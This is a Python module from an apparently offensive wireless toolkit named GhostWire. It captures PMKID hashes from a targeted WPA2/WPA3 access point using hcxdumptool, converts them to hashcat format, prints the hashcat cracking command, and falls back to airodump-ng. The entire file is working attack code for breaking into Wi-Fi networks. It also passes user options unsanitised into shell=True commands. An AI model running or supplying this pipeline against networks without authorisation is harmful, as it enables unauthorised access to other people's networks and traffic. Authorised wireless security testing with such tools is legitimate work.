"""
GhostWire WiFi Module — PMKID Capture
Captures PMKID from WPA2/WPA3 APs for offline cracking.
"""

import subprocess
import time
from pathlib import Path
from ghostwire.core.base import BaseModule, Meta


class Module(BaseModule):
    class Meta(Meta):
        name = "pmkid"
        description = "Capture PMKID from WPA2/WPA3 access points for offline cracking"
        category = "wifi"
        requirements = ["hcxdumptool", "hcxpcapngtool"]
        options = {
            "target": {"description": "Target AP BSSID", "required": True},
            "iface": {"description": "Wireless interface", "required": False},
            "duration": {"description": "Capture duration in seconds", "default": 120},
            "output": {"description": "Output file path", "default": None},
        }

    def info(self):
        return f"PMKID capture: {self.get_option('target')} for {self.get_option('duration', 120)}s"

    def run(self, **kwargs):
        target = self.get_option("target") or kwargs.get("target")
        iface = self.get_option("iface") or self.ctx.config.get("wifi_iface")
        duration = int(self.get_option("duration", 120))
        output = self.get_option("output")

        if not target:
            self.logger.error("No target BSSID specified")
            return
        if not iface:
            self.logger.error("No wireless interface found")
            return

        out_dir = Path(self.ctx.config.get("output_dir"))
        out_dir.mkdir(parents=True, exist_ok=True)
        pcap_file = output or str(out_dir / f"pmkid_{target.replace(':','')}.pcapng")
        hash_file = pcap_file.replace(".pcapng", ".hc22000")

        self.logger.info(f"PMKID capture: {target} on {iface} for {duration}s")

        # Method 1: hcxdumptool (preferred)
        self.logger.info("Starting hcxdumptool...")
        filter_arg = f"--filterlist_ap={target} --filterlist_ap_enable=1" if target else ""
        cmd = f"hcxdumptool -i {iface} --enable_status=1 -o {pcap_file} {filter_arg}"

        self.logger.info(f"Running: {cmd}")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=duration + 15)

        if result.returncode == 0:
            self.logger.success(f"Capture saved: {pcap_file}")
        else:
            self.logger.warn(f"hcxdumptool exited with code {result.returncode}")

        # Convert to hashcat format
        if Path(pcap_file).exists():
            self.logger.info("Converting to hashcat format...")
            subprocess.run(
                f"hcxpcapngtool -o {hash_file} {pcap_file}",
                shell=True, capture_output=True, timeout=30
            )
            if Path(hash_file).exists():
                self.logger.success(f"Hashes saved: {hash_file}")
                self.logger.info(f"Crack with: hashcat -m 22000 {hash_file} <wordlist>")
            else:
                self.logger.warn("Hash conversion failed")
        else:
            # Fallback: airodump-ng method
            self.logger.info("Falling back to airodump-ng capture...")
            cap_file = out_dir / f"capture_{target.replace(':','')}"
            subprocess.run(
                f"airodump-ng -c 1 --bssid {target} -w {cap_file} {iface}",
                shell=True, timeout=duration + 10
            )
            self.logger.info(f"Capture saved: {cap_file}-01.cap")

        self.session.add_result({
            "module": "wifi/pmkid",
            "target": target,
            "pcap": pcap_file,
            "hash_file": hash_file if Path(hash_file).exists() else None,
            "status": "complete",
        })
